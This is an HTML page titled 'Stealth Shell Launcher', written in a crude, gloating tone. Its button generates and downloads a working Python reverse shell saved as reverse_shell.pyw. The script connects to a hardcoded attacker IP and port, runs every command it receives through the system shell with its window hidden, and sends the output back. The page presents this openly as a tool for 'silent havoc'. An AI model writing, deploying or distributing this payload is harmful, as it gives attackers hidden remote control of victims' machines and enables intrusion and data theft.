<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Stealth Shell Launcher</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #ff1a1a;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        button {
            background-color: #ff1a1a;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #b30000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Unleash the Shadow</h1>
        <p>Click the fucking button to download the stealth reverse shell script, you crafty bastard.</p>
        <button onclick="downloadAndRun()">Launch Stealth</button>
    </div>

    <script>
        function downloadAndRun() {
            // Create a blob with the Python script
            const pythonScript = `
import socket
import subprocess

def reverse_shell():
    host = '192.168.0.152'  # Attacker's IP
    port = 4444             # Attacker's port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break

        output = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            creationflags=0x08000000  # Hides the window
        )
        result = output.stdout + output.stderr
        s.send(result.encode())

    s.close()

if __name__ == "__main__":
    reverse_shell()
            `;
            
            const blob = new Blob([pythonScript], { type: 'text/x-python' });
            const url = window.URL.createObjectURL(blob);
            
            // Create a temporary link to download the file as .pyw
            const a = document.createElement('a');
            a.href = url;
            a.download = 'reverse_shell.pyw';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);

            // Alert the user (just for show, you sneaky fuck)
            alert('Stealth script downloaded as reverse_shell.pyw! Run it to wreak silent havoc.');
        }
    </script>
</body>
</html>
